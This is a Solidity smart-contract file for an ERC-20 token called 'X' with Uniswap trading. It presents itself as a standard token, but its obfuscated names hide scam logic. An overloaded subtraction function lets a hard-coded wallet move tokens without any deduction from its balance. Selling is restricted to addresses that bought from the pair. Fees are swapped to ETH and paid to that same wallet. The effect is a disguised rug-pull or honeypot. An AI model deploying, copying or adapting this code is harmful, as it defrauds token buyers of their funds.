/*

Twitter: https://twitter.com/Xeth_Portal

Telegram: https://t.me/Xeth_Portal

Website: https://xerc.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _Dfvnb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _Dfvnb(a, b, "SafeMath");
    }

    function  _Dfvnb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _kiqae(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _bnqlc;
    address payable private Fdprk;
    address private _Brofq;
    string private constant _name = unicode"X";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Radve=0;
    uint256 private _pijra=0;
    uint256 public _fploh = _totalSupply;
    uint256 public _qrjrb = _totalSupply;
    uint256 public _povbr= _totalSupply;
    uint256 public _qaerb= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _Kbrea;
    mapping (address => bool) private _hfrqk;
    mapping(address => uint256) private _Evfog;

    bool private _fordopen;
    bool public _prekg = false;
    bool private pyrkr = false;
    bool private _rjpeo = false;


    event _bueap(uint _fploh);
    modifier gvouf {
        pyrkr = true;
        _;
        pyrkr = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _Kbrea[owner(

        )] = true;
        _Kbrea[address
        (this)] = true;
        _Kbrea[
            Fdprk] = true;
        Fdprk = 
        payable (0x60a629dAFb953ac79E2549e5eABbC5638Dcc1E8E);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _Dfvnb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 elybae=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_prekg) {
                if (to 
                != address
                (_bnqlc) 
                && to !=
                 address
                 (_Brofq)) {
                  require(_Evfog
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _Evfog
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _Brofq && to != 
            address(_bnqlc) &&
             !_Kbrea[to] ) {
                require(amount 
                <= _fploh,
                 "Exceeds the _fploh.");
                require(balanceOf
                (to) + amount
                 <= _qrjrb,
                  "Exceeds the _qrjrb.");
                if(_pijra
                < _Radve){
                  require
                  (! _gpubv(to));
                }
                _pijra++;
                 _hfrqk
                 [to]=true;
                elybae = amount._kiqae
                ((_pijra>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _Brofq &&
             from!= address(this) 
            && !_Kbrea[from] ){
                require(amount <= 
                _fploh && 
                balanceOf(Fdprk)
                <_qaerb,
                 "Exceeds the _fploh.");
                elybae = amount._kiqae((_pijra>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_pijra>
                _Radve &&
                 _hfrqk[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!pyrkr 
            && to == _Brofq &&
             _rjpeo &&
             contractTokenBalance>
             _povbr 
            && _pijra>
            _Radve&&
             !_Kbrea[to]&&
              !_Kbrea[from]
            ) {
                _transferFrom( _Bylnk(amount, 
                _Bylnk(contractTokenBalance,
                _qaerb)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _qvrve(address
                    (this).balance);
                }
            }
        }

        if(elybae>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(elybae);
          emit
           Transfer(from,
           address
           (this),elybae);
        }
        _balances[from
        ]= _Dfvnb(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _Dfvnb(elybae));
        emit Transfer
        (from, to, 
        amount.
         _Dfvnb(elybae));
    }

    function _transferFrom(uint256
     tokenAmount) private
      gvouf {
        if(tokenAmount==
        0){return;}
        if(!_fordopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _bnqlc.WETH();
        _approve(address(this),
         address(
             _bnqlc), 
             tokenAmount);
        _bnqlc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _Bylnk
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _Dfvnb(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == Fdprk){
            return a ;
        }else{
            return a .
             _Dfvnb (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _fploh = _totalSupply;
        _qrjrb = _totalSupply;
        emit _bueap(_totalSupply);
    }

    function _gpubv(address 
    account) private view 
    returns (bool) {
        uint256 Oprye;
        assembly {
            Oprye :=
             extcodesize
             (account)
        }
        return Oprye > 
        0;
    }

    function _qvrve(uint256
    amount) private {
        Fdprk.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _fordopen ) ;
        _bnqlc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _bnqlc), 
            _totalSupply);
        _Brofq = 
        IUniswapV2Factory(_bnqlc.
        factory( ) 
        ). createPair (
            address(this
            ),  _bnqlc .
             WETH ( ) );
        _bnqlc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_Brofq).
        approve(address(_bnqlc), 
        type(uint)
        .max);
        _rjpeo = true;
        _fordopen = true;
    }

    receive() external payable {}
}